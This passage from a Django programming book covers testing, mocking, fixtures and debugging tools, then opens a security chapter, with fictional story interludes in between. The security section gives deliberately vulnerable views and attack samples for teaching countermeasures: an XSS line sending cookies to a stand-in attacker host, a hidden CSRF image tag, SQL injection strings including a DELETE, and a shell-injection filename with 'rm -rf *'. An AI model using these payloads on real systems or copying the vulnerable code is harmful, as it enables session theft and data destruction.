home page view. Like most good tests, it has  a long and self-descriptive name. The test simply uses Django's resolve   function  to match the view callable mapped to the " " root location to the known view  function by their names.  It is more important to note what is not done in this test. We have not tried to  retrieve the HTML contents of the page or check its status code. We have restricted  ourselves to test just one unit, that is, the resolve   function, which maps the URL  paths to view functions.  Assuming that this test resides in, say, app1 of your project, the test can be run with  the following command:  $ . manage.py test app1 Creating test database for alias 'default'... . ----------------------------------------------------------------- Ran 1 test in 0.088s  OK Destroying test database for alias 'default'...  [ 637 ]  Chapter 9   This command runs all the tests in the app1 application or package. The default   test runner will look for tests in all modules in this package matching the pattern  test*.py.  Django now uses the standard unittest module provided by Python rather   than bundling its own. You can write a testcase class by subclassing from   django.test.TestCase. This class typically has methods with the following   naming convention:     test*: Any method whose name starts with test will be executed as a test  method. It takes no parameters and returns no values. Tests will be run in   an alphabetical order.     setUp  optional : This method will be run before each test method. It can be  used to create common objects or perform other initialization tasks that bring  your test case to a known state.     tearDown  optional : This method will be run after a test method, irrespective  of whether the test passed or not. Clean-up tasks are usually performed here.  A test case is a way to logically group test methods, all of which test a scenario.  When all the test methods pass  that is, do not raise any exception , then the test case  is considered passed. If any of them fail, then the test case fails.  The assert method Each test method usually invokes an assert*   method to check some expected  outcome of the test. In our first example, we used assertEqual   to check whether  the function name matches with the expected function.  Similar to assertEqual  , the Python 3 unittest library provides more than 32  assert methods. It is further extended by Django by more than 19 framework-specific  assert methods. You must choose the most appropriate method based on the end  outcome that you are expecting so that you will get the most helpful error message.  Let's see why by looking at an example testcase that has the following   setUp   method:  def setUp self :     self.l1 = [1, 2]     self.l2 = [1, 0]  [ 638 ]  Testing and Debugging   Our test is to assert that l1 and l2 are equal  and it should fail, given their values .  Let's take a look at several equivalent ways to accomplish this:  Test Assertion Statement  assert self.l1 == self.l2  self.assertEqual self.l1,  self.l2   self.assertListEqual  self. l1, self.l2   What Test Output Looks Like   unimportant lines omitted   assert self.l1 == self.l2 AssertionError AssertionError: Lists differ:  [1, 2] != [1, 0] First differing element 1: 2 0 AssertionError: Lists differ:  [1, 2] != [1, 0]  First differing element 1: 2 0 AssertionError: Second sequence  is not a list: None  self.assertListEqual self.l1,  None   The first statement uses Python's built- in assert keyword. Notice that it throws   the least helpful error. You cannot infer what values or types are in the self.l1   and self.l2 variables. This is primarily the reason why we need to use the  assert*   methods.  Next, the exception thrown by assertEqual   very helpfully tells you that you are  comparing two lists and even tells you at which position they begin to differ. This is  exactly similar to the exception thrown by the more specialized assertListEqual    function. This is because, as the documentation would tell you, if assertEqual   is  given two lists for comparison, then it hands it over to assertListEqual  .  Despite this, as the last example proves, it is always better to use the most specific  assert* method for your tests. Since the second argument is not a list, the error  clearly tells you that a list was expected.  Use the most specific assert* method in your tests.  [ 639 ]  Chapter 9   Therefore, you need to familiarize yourself with all the assert methods, and choose  the most specific one to evaluate the result you expect. This also applies to when  you are checking whether your application does not do things it is not supposed  to do, that is, a negative test case. You can check for exceptions or warnings using  assertRaises and assertWarns respectively.  Writing better test cases We have already seen that the best test cases test a small unit of code at a time.   They also need to be fast. A programmer needs to run tests at least once before   every commit to the source control. Even a delay of a few seconds can tempt a  programmer to skip running tests  which is not a good thing .  Here are some qualities of a good test case  which is a subjective term, of course    in the form of an easy-to-remember mnemonic "F.I.R.S.T. class test case":  1.  Fast: the faster the tests, the more often they are run. Ideally, your tests   should complete in a few seconds.  2.  Independent: Each test case must be independent of others and can be    run in any order.  3.  Repeatable: The results must be the same every time a test is run. Ideally,   all random and varying factors must be controlled or set to known values  before a test is run.  4.  Small: Test cases must be as short as possible for speed and ease of   understanding.  5.  Transparent: Avoid tricky implementations or ambiguous test cases.  Additionally, make sure that your tests are automatic. Eliminate any manual steps,  no matter how small. Automated tests are more likely to be a part of your team's  workflow and easier to use for tooling purposes.  Perhaps, even more important are the don'ts to remember while writing test cases:    Do not  re test the framework: Django is well tested. Don't check for URL   lookup, template rendering, and other framework-related functionality.     Do not test implementation details: Test the interface and leave the minor   implementation details. It makes it easier to refactor this later without  breaking the tests.     Test models most, templates least: Templates should have the least business   logic, and they change more often.  [ 640 ]  Testing and Debugging      Avoid HTML output validation: Test views use their context variable's   output rather than its HTML-rendered output.     Avoid using the web test client in unit tests: Web test clients invoke several   components and are therefore, better suited for integration tests.     Avoid interacting with external systems: Mock them if possible. Database is   an exception since test database is in-memory and quite fast.  Of course, you can  and should  break the rules where you have a good reason to   just like I did in my first example . Ultimately, the more creative you are at writing  tests, the earlier you can catch bugs, and the better your application will be.  Mocking Most real-life projects have various interdependencies between components. While  testing one component, the result must not be affected by the behavior of other  components. For example, your application might call an external web service that  might be unreliable in terms of network connection or slow to respond.  Mock objects imitate such dependencies by having the same interface, but they  respond to method calls with canned responses. After using a mock object in a test,  you can assert whether a certain method was called and verify that the expected  interaction took place. Take the example of the SuperHero profile eligibility test mentioned in Pattern:  Service objects  see Chapter 3, Models . We are going to mock the call to the service  object method in a test using the Python 3 unittest.mock library:   profiles tests.py from django.test import TestCase from unittest.mock import patch from django.contrib.auth.models import User  class TestSuperHeroCheck TestCase :     def test_checks_superhero_service_obj self :         with patch "profiles.models.SuperHeroWebAPI"  as ws:             ws.is_hero.return_value = True             u = User.objects.create_user username="t"              r = u.profile.is_superhero           ws.is_hero.assert_called_with 't'          self.assertTrue r   [ 641 ]  Chapter 9   Here, we are using patch   as a context manager in a with statement. Since the  profile model's is_superhero   method will call the SuperHeroWebAPI.is_hero    class method, we need to mock it inside the models module. We are also hard-coding  the return value of this method to be True.  The last two assertions check whether the method was called with the correct  arguments and if is_hero   returned True, respectively. Since all methods of  SuperHeroWebAPI class have been mocked, both the assertions will pass. Mock objects come from a family called Test Doubles, which includes stubs, fakes,  and so on. Like movie doubles who stand in for real actors, these test doubles are  used in place of real objects while testing. While there are no clear lines drawn  between them, Mock objects are objects that can test the behavior, and stubs are  simply placeholder implementations.  Pattern – test fixtures and factories Problem: Testing a component requires the creation of various prerequisite objects  before the test. Creating them explicitly in each test method gets repetitive. Solution: Utilize factories or fixtures to create the test data objects.  Problem details Before running each test, Django resets the database to its initial state, as it would  be after running migrations. Most tests will need the creation of some initial objects  to set the state. Rather than creating different initial objects for different scenarios, a  common set of initial objects are usually created.  This can quickly get unmanageable in a large test suite. The sheer variety of such  initial objects can be hard to read and later understand. This leads to hard-to-find  bugs in the test data itself!  Being such a common problem, there are several means to reduce the clutter and  write clearer test cases.  Solution details The first solution we will take a look at is what is given in the Django documentation  itself—test fixtures. Here, a test fixture is a file that contains a set of data that can be  imported into your database to bring it to a known state. Typically, they are YAML  or JSON files previously exported from the same database when it had some data.  [ 642 ]  Testing and Debugging   For example, consider the following test case, which uses a test fixture:  from django.test import TestCase  class PostTestCase TestCase :     fixtures = ['posts']      def setUp self :          Create additional common objects         pass      def test_some_post_functionality self :          By now fixtures and setUp   objects are loaded         pass  Before setUp   gets called in each test case, the specified fixture, posts gets loaded.  Roughly speaking, the fixture would be searched for in the fixtures directory with  certain known extensions, for example, app fixtures posts.json.  However, there are a number of problems with fixtures. Fixtures are static snapshots  of the database. They are schema-dependent and have to be changed each time your  models change. They also might need to be updated when your test-case assertions  change. Updating a large fixture file manually, with multiple related objects,   is no joke.  For all these reasons, many consider using fixtures as an anti-pattern. It is  recommended that you use factories instead. A factory class creates objects of a  particular class that can be used in tests. It is a DRY way of creating initial test objects.  Let's use a model's objects.create method to create a simple factory:  from django.test import TestCase from .models import Post  class PostFactory:     def make_post self :         return Post.objects.create message=""   class PostTestCase TestCase :      def setUp self :         self.blank_message = PostFactory  .makePost        def test_some_post_functionality self :         pass  [ 643 ]  Chapter 9   Compared to using fixtures, the initial object creation and the test cases are all in one  place. Fixtures load static data as is into the database without calling model-defined  save   methods. Since factory objects are dynamically generated, they are more  likely to run through your application's custom validations.  However, there is a lot of boilerplate in writing such factory classes yourself.   The factory_boy package, based on thoughtbot's factory_girl, provides a  declarative syntax for creating object factories.  Rewriting the previous code to use factory_boy, we get the following result:  import factory from django.test import TestCase from .models import Post  class PostFactory factory.Factory :     class Meta:         model = Post     message = ""  class PostTestCase TestCase :      def setUp self :         self.blank_message = PostFactory.create           self.silly_message = PostFactory.create message="silly"       def test_post_title_was_set self :         self.assertEqual self.blank_message.message, ""          self.assertEqual self.silly_message.message, "silly"   Notice how clear the factory class becomes when written in a declarative fashion.  The attribute's values do not have to be static. You can have sequential, random, or  computed attribute values. If you prefer to have more realistic placeholder data such  as US addresses, then use the django-faker package.  In conclusion, I would recommend factories, especially factory_boy, for most  projects that need initial test objects. One might still want to use fixtures for static  data, such as lists of countries or t-shirt sizes, since they would rarely change.  [ 644 ]  Testing and Debugging   Dire Predictions After the announcement of the impossible deadline, the entire  team seemed to be suddenly out of time. They went from 4-week  scrum sprints to 1-week sprints. Steve wiped every meeting off  their calendars except "today's 30-minute catch-up with Steve." He  preferred to have a one-on-one discussion if he needed to talk to  someone at their desk. At Madam O's insistence, the 30-minute meetings were held at a  sound proof hall 20 levels below the S.H.I.M. headquarters. On  Monday, the team stood around a large circular table with a gray  metallic surface like the rest of the room. Steve stood awkwardly in  front of it and made a stiff waving gesture with an open palm. Even though everyone had seen the holographs come alive before,  it never failed to amaze them each time. The disc almost segmented  itself into hundreds of metallic squares and rose like miniature  skyscrapers in a futuristic model city. It took them a second to  realize that they were looking at a 3D bar chart. "Our burn-down chart seems to be showing signs of slowing down.  I am guessing it is the outcome of our recent user tests, which is a  good thing. But…" Steve's face seemed to show the strain of trying  to stifle a sneeze. He gingerly flicked his forefinger upwards in the  air and the chart smoothly extended to the right. "At this rate, projections indicate that we will miss the go-live  by several days, at best. I did a bit of analysis and found several  critical bugs late in our development. We can save a lot of time and  effort if we can catch them early. I want to put your heads together  and come up with some i..." Steve clasped his mouth and let out a loud sneeze. The holograph  interpreted this as a sign to zoom into a particularly uninteresting  part of the graph. Steve cursed under his breath and turned it  off. He borrowed a napkin and started noting down everyone's  suggestions with an ordinary pen. One of the suggestions that Steve liked most was a coding checklist  listing the most common bugs, such as forgetting to apply  migrations. He also liked the idea of involving users earlier in  the development process for feedback. He also noted down some  unusual ideas, such as a Twitter handle for tweeting the status of  the continuous integration server. At the close of the meeting, Steve noticed that Evan was missing.  "Where is Evan?" he asked. "No idea," said Brad looking confused,  "he was here a minute ago."  [ 645 ]  Chapter 9   Learning more about testing Django's default test runner has improved a lot over the years. However, test runners  such as py.test and nose are still superior in terms of functionality.   They make your tests easier to write and run. Even better, they are compatible   with your existing test cases.  You might also be interested in knowing what percentage of your code is covered  by tests. This is called Code coverage and coverage.py is a very popular tool for  finding this out.  Most projects today tend to use a lot of JavaScript functionality. Writing tests for  them usually require a browser-like environment for execution. Selenium is a great  browser automation tool for executing such tests.  While a detailed treatment of testing in Django is outside the scope of this book,   I would strongly recommend that you learn more about it.  If nothing else, the two main takeaways I wanted to convey through this section are  first, write tests, and second, once you are confident at writing them, practice TDD.  Debugging Despite the most rigorous testing, the sad reality is, we still have to deal with   bugs. Django tries its best to be as helpful as possible while reporting an error to   help you in debugging. However, it takes a lot of skill to identify the root cause   of the problem.  Thankfully, with the right set of tools and techniques, we can not only identify the  bugs but also gain great insight into the runtime behavior of your code. Let's take a  look at some of these tools.  [ 646 ]  Testing and Debugging   Django debug page If you have encountered any exception in development, that is, when DEBUG=True,  then you would have already seen an error page similar to the following screenshot:  [ 647 ]  Chapter 9   Since it comes up so frequently, most developers tend to miss the wealth of  information in this page. Here are some places to take a look at:     Exception details: Obviously, you need to read what the exception tells    you very carefully.     Exception location: This is where Python thinks where the error has  occurred. In Django, this may or may not be where the root cause of   the bug is.     Traceback: This was the call stack when the error occurred. The line that  caused the error will be at the end. The nested calls that led to it will be   above it. Don't forget to click on the 'Local vars' arrow to inspect the values  of the variables at the time of the exception.     Request information: This is a table  not shown in the screenshot  that   shows context variables, meta information, and project settings. Check for  malformed input in the requests here.  A better debug page Often, you may wish for more interactivity in the default Django error page.   The django-extensions package ships with the fantastic Werkzeug debugger that  provides exactly this feature. In the following screenshot of the same exception,  notice a fully interactive Python interpreter available at each level of the call stack:  [ 648 ]  Testing and Debugging   To enable this, in addition to adding django_extensions to your INSTALLED_APPS,  you will need to run your test server as follows:  $ python manage.py runserver_plus  Despite the reduced debugging information, I find the Werkzeug debugger to be  more useful than the default error page.  The print function Sprinkling print   functions all over the code for debugging might sound primitive,  but it has been the preferred technique for many programmers.  Typically, the print   functions are added before the line where the exception has  occurred. It can be used to print the state of variables in various lines leading to the  exception. You can trace the execution path by printing something when a certain  line is reached.  In development, the print output usually appears in the console window where the  test server is running. Whereas in production, these print outputs might end up in  your server log file where they would add a runtime overhead.  In any case, it is not a good debugging technique to use in production. Even if you  do, the print functions that are added for debugging should be removed from being  committed to your source control.  Logging The main reason for including the previous section was to say—You should replace  the print   functions with calls to logging functions in Python's logging module.  Logging has several advantages over printing: it has a timestamp, a clearly marked  level of urgency  for example, INFO, DEBUG , and you don't have to remove them  from your code later.  Logging is fundamental to professional web development. Several applications in  your production stack, like web servers and databases, already use logs. Debugging  might take you to all these logs to retrace the events that lead to a bug. It is only  appropriate that your application follows the same best practice and adopts logging  for errors, warnings, and informational messages.  Unlike the common perception, using a logger does not involve too much work.  Sure, the setup is slightly involved but it is merely a one-time effort for your entire  project. Even more, most project templates  for example, the edge template  already  do this for you.  [ 649 ]  Chapter 9   Once you have configured the LOGGING variable in settings.py, adding a logger to  your existing code is quite easy, as shown here:   views.py import logging logger = logging.getLogger __name__    def complicated_view  :     logger.debug "Entered the complicated_view  !"   The logging module provides various levels of logged messages so that you can  easily filter out less urgent messages. The log output can be also formatted in various  ways and routed to many places, such as standard output or log files. Read the  documentation of Python's logging module to learn more.  The Django Debug Toolbar The Django Debug Toolbar is an indispensable tool not just for debugging but also for  tracking detailed information about each request and response. Rather than appearing  only during exceptions, the toolbar is always present in your rendered page.  Initially, it appears as a clickable graphic on the right-hand side of your browser  window. On clicking, a toolbar appears as a dark semi-transparent sidebar with  several headers:   [ 650 ]  Testing and Debugging   Each header is filled with detailed information about the page from the number  of SQL queries executed to the templates that we use to render the page. Since the  toolbar disappears when DEBUG is set to False, it is pretty much restricted to being a  development tool.  The Python debugger pdb While debugging, you might need to stop a Django application in the middle of  execution to examine its state. A simple way to achieve this is to raise an exception  with a simple assert False line in the required place.  What if you wanted to continue the execution step by step from that line? This is  possible with the use of an interactive debugger such as Python's pdb. Simply insert   the following line wherever you want the execution to stop and switch to pdb:  import pdb; pdb.set_trace    Once you enter pdb, you will see a command-line interface in your console window  with a  Pdb  prompt. At the same time, your browser window will not display  anything as the request has not finished processing.  The pdb command-line interface is extremely powerful. It allows you to go through  the code line by line, examine the variables by printing them, or execute arbitrary  code that can even change the running state. The interface is quite similar to GDB,  the GNU debugger.  Other debuggers There are several drop-in replacements for pdb. They usually have a better interface.  Some of the console-based debuggers are as follows:     ipdb: Like IPython, this has autocomplete, syntax-colored code, and so on.    pudb: Like old Turbo C IDEs, this shows the code and variables side by side.    IPython: This is not a debugger. You can get a full IPython shell anywhere    in your code by adding the from IPython import embed; embed  line.  PuDB is my preferred replacement for pdb. It is so intuitive that even beginners  can easily use this interface. Like pdb, just insert the following code to break the  execution of the program:  import pudb; pudb.set_trace    [ 651 ]  Chapter 9   When this line is executed, a full-screen debugger is launched, as shown here:  Press the ? key to get help on the complete list of keys that you can use.  Additionally, there are several graphical debuggers, some of which are standalone,  such as winpdb and others, which are integrated to the IDE, such as PyCharm,  PyDev, and Komodo. I would recommend that you try several of them until you   find the one that suits your workflow.  Debugging Django templates Projects can have very complicated logic in their templates. Subtle bugs while  creating a template can lead to hard-to-find bugs. We need to set TEMPLATE_DEBUG to  True  in addition to DEBUG  in settings.py so that Django shows a better error page  when there is an error in your templates.  There are several crude ways to debug templates, such as inserting the variable of  interest, such as {{ variable }}, or if you want to dump all the variables, use the  built-in debug tag like this  inside a conveniently clickable text area :       {% filter force_escape %}      {% debug %}    {% endfilter %}    [ 652 ]  Testing and Debugging   A better option is use the Django Debug Toolbar mentioned earlier. It not only   tells you the values of the context variables but also shows the inheritance tree   of your templates.  However, you might want to pause in the middle of a template to inspect the   state  say, inside a loop . A debugger would be perfect for such cases. In fact,   it is possible to use any one of the aforementioned Python debuggers for your  templates using custom template tags.  Here is a simple implementation of such a template tag. Create the following file  inside a templatetag package directory:   templatetags debug.py import pudb as dbg               Change to any *db from django.template import Library, Node  register = Library    class PdbNode Node :  @register.tag def pdb parser, token :     return PdbNode        def render self, context :         dbg.set_trace            Debugger will stop here         return ''  In your template, load the template tag library, insert the pdb tag wherever you need  the execution to pause, and enter the debugger:   {% load debug %}  {% for item in items %}     { Some place you want to break }     {% pdb %} {% endfor %}  Within the debugger, you can examine anything, including the context variables  using the context dictionary:  >>> print context["item"]   Item0  If you need more such template tags for debugging and introspection, then I would  recommend that you check out the django-template-debug package.  [ 653 ]  Chapter 9   Summary In this chapter, we looked at the motivations and concepts behind testing in Django.  We also found the various best practices to be followed while writing a test case.  In the section on debugging, we got familiar with the various debugging tools and  techniques to find bugs in Django code and templates.  In the next chapter, we will get one step closer to production code by understanding  the various security issues and how to reduce threats from various kinds of  malicious attacks.  [ 654 ]  Testing and Debugging   Security  In this chapter, we will discuss the following topics:     Various web attacks and countermeasures    Where Django can and cannot help    Security checks for Django applications  Several prominent industry reports suggest that websites and web applications   remain one of the primary targets of cyber attacks. Yet, about 86 percent of all websites,  tested by a leading security firm in 2013, had at least one serious vulnerability.  Releasing your application to the wild is fraught with several dangers ranging   from the leaking of confidential information to denial-of service attacks. Mainstream  media headlines security flaws focusing on exploits, such as Heartbleed, Superfish,  and POODLE, that have an adverse impact on critical website applications, such as  e-mail and banking. Indeed, one often wonders if WWW stands for World Wide   Web or the Wild Wild West.  One of the biggest selling points of Django is its strong focus on security. In this  chapter, we will cover the top techniques that attackers use. As we will soon see,  Django can protect you from most of them out of the box.  I believe that to protect your site from attackers, you need to think like one.   So, let's familiarize ourselves with the common attacks.  Cross-site scripting  XSS  Cross-site scripting  XSS , considered the most prevalent web application security  flaw today, enables an attacker to execute his malicious scripts  usually JavaScript   on web pages viewed by users. Typically, the server is tricked into serving their  malicious content along with the trusted content.  [ 655 ]   How does a malicious piece of code reach the server? The common means of  entering external data into a website are as follows:     Form fields    URLs    Redirects    External scripts such as Ads or Analytics  None of these can be entirely avoided. The real problem is when outside data gets  used without being validated or sanitized  as shown in the following screenshot .  Never trust outside data:  For example, let's take a look at a piece of vulnerable code, and how an XSS attack  can be performed on it. It is strongly advised not to use this code in any form:  class XSSDemoView View :     def get self, request :           WARNING: This code is insecure and prone to XSS attacks                   *** Do not use it!!! ***         if 'q' in request.GET:             return HttpResponse "Searched for: {}".format                      request.GET['q']           else:             return HttpResponse """                     Go           """   [ 656 ]  Security   This is a View class that shows a search form when accessed without any GET  parameters. If the search form is submitted, it shows the search string entered   by the user in the form.  Now open this view in a dated browser  say, IE 8 , and enter the following search  term in the form and submit it:   alert "pwned"    Unsurprisingly, the browser will show an alert box with the ominous message.   Note that this attack fails in the latest Webkit browsers such as Chrome with an   error in the console—Refused to execute a JavaScript script. Source code of script  found within request. In case, you are wondering what harm a simple alert message could cause, remember  that any JavaScript code can be executed in the same manner. In the worst case, the  user's cookies can be sent to a site controlled by the attacker by entering the following  search term:   var adr = 'http:  lair.com evil.php?stolen=' +  escape document.cookie ;   Once your cookies are sent, the attacker might be able to conduct a more serious attack.  Why are your cookies valuable? It might be worth understanding why cookies are the target of several attacks.  Simply put, access to cookies allows attackers to impersonate you and even take  control of your web account.  To understand this in detail, you need to understand the concept of sessions.   HTTP is stateless. Be it an anonymous or an authenticated user, Django keeps   track of their activities for a certain duration of time by managing sessions.  A session consists of a session ID at the client end, that is, the browser, and  a dictionary-like object stored at the server end. The session ID is a random  32-character string that is stored as a cookie in the browser. Each time a user   makes a request to a website, all their cookies, including this session ID, are   sent along with the request.  At the server end, Django maintains a session store that maps this session ID to  the session data. By default, Django stores the session data in the django_session  database table.  [ 657 ]  Chapter 10   Once a user successfully logs in, the session will note that the authentication was  successful and will keep track of the user. Therefore, the cookie becomes a temporary  user authentication for subsequent transactions. Anyone who acquires this cookie  can use this web application as that user, which is called session hijacking.  How Django helps You might have observed that my example was an extremely unusual way of  implementing a view in Django for two reasons: it did not use templates for rendering  and form classes were not used. Both of them have XSS-prevention measures.  By default, Django templates auto-escape HTML special characters. So, if you had  displayed the search string in a template, all the tags would have been HTML  encoded. This makes it impossible to inject scripts unless you explicitly turn them   off by marking the content as safe.  Using forms in Django to validate and sanitize the input is also a very effective  countermeasure. For example, if your application requires a numeric employee ID,  then use an IntegerField class rather than the more permissive CharField class.  In our example, we can use a RegexValidator class in our search-term field to  restrict the user to alphanumeric characters and allowed punctuation symbols  recognized by your search module. Restrict the acceptable range of the user input   as strictly as possible.  Where Django might not help Django can prevent 80 percent of XSS attacks through auto-escaping in templates.  For the remaining scenarios, you must take care to:     Quote all HTML attributes, for example, replace   with         Escape dynamic data in CSS or JavaScript using custom methods    Validate all URLs, especially against unsafe protocols such as javascript:    Avoid client-side XSS  also, known as DOM-based XSS   As a general rule against XSS, I suggest—filter on input and escape on output. Make  sure that you validate and sanitize  filter  any data that comes in and transform   escape  it immediately before sending it to the user. Specifically, if you need to  support the user input with HTML formatting such as comments, consider using  Markdown instead.  [ 658 ]  Security   Filter on input and escape on output.  Cross-Site Request Forgery  CSRF  Cross-Site Request Forgery  CSRF  is an attack that tricks a user into making  unwanted actions on a website, where they are already authenticated, while they  are visiting another site. Say, in a forum, an attacker can place an IMG or IFRAME tag  within the page that makes a carefully crafted request to the authenticated site.  For instance the following fake 0x0 image can be embedded in a comment:  <img src="http:  superbook.com post?message=I+am+a+Dufus" width="0"  height="0" border="0">  If you were already signed into SuperBook in another tab, and if the site didn't have  CSRF countermeasures, then a very embarrassing message will be posted. In other  words, CSRF allows the attacker to perform actions by assuming your identity.  How Django helps The basic protection against CSRF is to use an HTTP POST  or PUT and DELETE, if  supported  for any action that has side effects. Any GET  or HEAD  request must be  used for information retrieval, for example, read-only.  Django offers countermeasures against POST, PUT, or DELETE methods by embedding  a token. You must already be familiar with the {% csrf_token %} mentioned inside  each Django form template. This is a random value that must be present while  submitting the form.  The way this works is that the attacker will not be able to guess the token while  crafting the request to your authenticated site. Since the token is mandatory and  must match the value presented while displaying the form, the form submission   fails and the attack is thwarted.  Where Django might not help Some people turn off CSRF checks in a view with the @csrf_exempt decorator,  especially for AJAX form posts. This is not recommended unless you have   carefully considered the security risks involved.  [ 659 ]  Chapter 10   SQL injection SQL injection is the second most common vulnerability of web applications,   after XSS. The attack involves entering malicious SQL code into a query that   gets executed on the database. It could result in data theft, by dumping database  contents, or the distruction of data, say, by using the DROP TABLE command.  If you are familiar with SQL, then you can understand the following piece of code.   It looks up an e-mail address based on the given username:  name = request.GET['user'] sql = "SELECT email FROM users WHERE username = '{}';".format name   At first glance, it might appear that only the e-mail address corresponding to the  username mentioned as the GET parameter will be returned. However, imagine if   an attacker entered ' OR '1'='1 in the form field, then the SQL code would be   as follows:  SELECT email FROM users WHERE username = '' OR '1'='1';  Since this WHERE clause will be always true, the e-mails of all the users in your  application will be returned. This can be a serious leak of confidential information.  Again, if the attacker wishes, he could execute more dangerous queries like the  following:  SELECT email FROM users WHERE username = ''; DELETE FROM users WHERE  '1'='1';  Now all the user entries will be wiped off your database!   How Django helps The countermeasure against a SQL injection is fairly simple. Use the Django ORM  rather than crafting SQL statements by hand. The preceding example should be  implemented as follows:  User.objects.get username=name .email  Here, Django's database drivers will automatically escape the parameters. This  will ensure that they are treated as purely data and therefore, they are harmless.  However, as we will soon see, even the ORM has a few escape latches.  [ 660 ]  Security   Where Django might not help There could be instances where people would need to resort to raw SQL, say, due  to limitations of the Django ORM. For example, the where clause of the extra    method of a queryset allows raw SQL. This SQL code will not be escaped against  SQL injections.  If you are using a low-level database operation, such as the execute   method,   then you might want to pass bind parameters instead of interpolating the SQL   string yourself. Even then, it is strongly recommended that you check whether   each identifier has been properly escaped.  Finally, if you are using a third-party database API such as MongoDB, then you   will need to manually check for SQL injections. Ideally, you would want to use   only thoroughly sanitized data with such interfaces.  Clickjacking Clickjacking is a means of misleading a user to click on a hidden link or button in  the browser when they were intending to click on something else. This is typically  implemented using an invisible IFRAME that contains the target website over a  dummy web page shown here  that the user is likely to click on:     Since the action button in the invisible frame would be aligned exactly above the  button in the dummy page, the user's click will perform an action on the target  website instead.  [ 661 ]  Chapter 10   How Django helps Django protects your site from clickjacking by using middleware that can be  fine-tuned using several decorators. By default, this 'django.middleware. clickjacking.XFrameOptionsMiddleware' middleware will be included in   your MIDDLEWARE_CLASSES within your settings file. It works by setting the  X-Frame-Options header to SAMEORIGIN for every outgoing HttpResponse.  Most modern browsers recognize the header, which means that this page should   not be inside a frame in other domains. The protection can be enabled and disabled   for certain views using decorators, such as @xframe_options_deny and   @xframe_options_exempt.  Shell injection As the name suggests, shell injection or command injection allows an attacker  to inject malicious code to a system shell such as bash. Even web applications use  command-line programs for convenience and their functionality. Such processes   are typically run within a shell.  For example, if you want to show all the details of a file whose name is given by   the user, a naïve implementation would be as follows:  os.system "ls -l {}".format filename    An attacker can enter the filename as manage.py; rm -rf * and delete all the   files in your directory. In general, it is not advisable to use os.system. The  subprocess module is a safer alternative  or even better, you can use os.stat     to get the file's attributes .  Since a shell will interpret the command-line arguments and environment   variables, setting malicious values in them can allow the attacker to execute   arbitrary system commands.  How Django helps Django primarily depends on WSGI for deployment. Since WSGI, unlike CGI,   does not set on environment variables based on the request, the framework itself   is not vulnerable to shell injections in its default configuration.  [ 662 ]  Security   However, if the Django application needs to run other executables, then care must be  taken to run it in a restricted manner, that is, with least permissions. Any parameter  originating externally must be sanitized before passing to such executables.  Additionally, use call   from the subprocess module to run command-line  programs with its default shell=False parameter to handle arguments securely   if shell interpolation is not necessary.  And the list goes on There are hundreds of attack techniques that we have not covered here, and the   list keeps growing every day as new attacks are found. It is important to keep  ourselves aware of them.  Django's official blog  https:  www.djangoproject.com weblog   is a great   place to find out about the latest exploits that have been discovered. Django  maintainers proactively try to resolve them by releasing security releases. It is   highly recommended that you install them as quickly as possible since they   usually need very little or no changes to your source code.  The security of your application is only as strong as its weakest link. Even if   your Django code might be completely secure, there are so many layers and  components in your stack. Not to mention humans, who can be also tricked   with various social-engineering techniques, such as phishing.  Vulnerabilities in one area, such as the OS, database, or web server, can be   exploited to gain access to other parts of your system. Hence, it is best to have   a holistic view of your stack rather than view each part separately.  The safe room As soon as Steve stepped outside the board room, he took out his  phone and thumbed a crisp one-liner e-mail to his team: "It's a go!"   In the last 60 minutes, he had been grilled by the directors   on every possible detail of the launch. Madam O, to Steve's  annoyance, maintained her stoic silence the entire time. He entered his cabin and opened his slide printouts once more.   The number of trivial bugs dropped sharply after the checklists were  introduced. Essential features that were impossible to include in the  release were worked out through early collaboration with helpful  users, such as Hexa and Aksel.  [ 663 ]  Chapter 10   The number of signups for the beta site had crossed 9,000, thanks  to Sue's brilliant marketing campaign. Never in his career had  Steve seen so much interest for a launch. It was then that he noticed  something odd about the newspaper on his desk. Fifteen minutes later, he rushed down the aisle in level-21. At the  very end, there was a door marked 2109. When he opened it, he saw  Evan working on what looked like a white plastic toy laptop. "Why  did you circle the crossword clues? You could have just called me,"  asked Steve. "I want to show you something," he replied with a grin. He grabbed  his laptop and walked out. He stopped between room 2110 and the  fire exit. He fell on his knees and with his right hand, he groped  the faded wallpaper. "There has to be a latch here somewhere," he  muttered. Then, his hand stopped and turned a handle barely protruding from  the wall. A part of the wall swiveled and came to a halt. It revealed  an entrance to a room lit with a red light. A sign inside dangling  from the roof said "Safe room 21B." As they entered, numerous screens and lights flicked on by  themselves. A large screen on the wall said "Authentication required.  Insert key." Evan admired this briefly and began wiring up his  laptop. "Evan, what are we doing here?" asked Steve in a hushed voice.  Evan stopped, "Oh, right. I guess we have some time before the tests  finish." He took a deep breath. "Remember when Madam O wanted me to look into the Sentinel  codebase? I did. I realized that we were given censored source code.  I mean I can understand removing some passwords here and there,  but thousands of lines of code? I kept thinking—there had to be  something going on. "So, with my access to the archiver, I pulled some of the older  backups. The odds of not erasing a magnetic medium are  surprisingly high. Anyways, I could recover most of the erased code.  You won't believe what I saw. "Sentinel was not an ordinary social network project. It was a  surveillance program. Perhaps the largest known to mankind.   Post-Cold War, a group of nations joined to form a network to share  the intelligence information. A network of humans and sentinels.  Sentinels are semi-autonomous computers with unbelievable  computing power. Some believe they are quantum computers.  [ 664 ]  Security   "Sentinels were inserted at thousands of strategic locations around  the world—mostly ocean beds where major fiber optic cables are  passed. Running on geothermal energy they were self-powered and  practically indestructible. They had access to nearly every Internet  communication in most countries. "At some point in the nineties, perhaps fearing public scrutiny,  the Sentinel program was shut down. This is where it gets really  interesting. The code history suggests that the development on  Sentinels was continued by someone named Cerebos. The code has  been drastically enhanced from its surveillance abilities to form a sort  of massively parallel supercomputer. A number-crunching beast for  whom no encryption algorithm poses a significant challenge. "Remember the breach? I found it hard to believe that there was not  a single offensive move before the superheroes arrived. So, I did  some research. S.H.I.M.'s cyber security is designed as five concentric  rings. We, the employees, are in the outermost, least privileged, ring  protected by Sauron. Inner rings are designed with increasingly  stronger cryptographic algorithms. This room is in Level 4. "My guess is—long before we knew about the breach, all systems of  SAURON were already compromised. Systems were down and it  was practically a cakewalk for those robots to enter the campus. I just  looked at the logs. The attack was extremely targeted—everything  from IP addresses to logins were known beforehand." "Insider?" asked Steve in horror.  "Yes. However, Sentinels needed help only for Level 5. Once they  acquired the public keys for Level 4, they began attacking Level 4  systems. It sounds insane but that was their strategy." "Why is it insane?" "Well, most of world's online security is based on public-key  cryptography or asymmetric cryptography. It is based on two keys:  one public and the other private. Although mathematically related—it  is computationally impractical to find one key, if you have the other." "Are you saying that 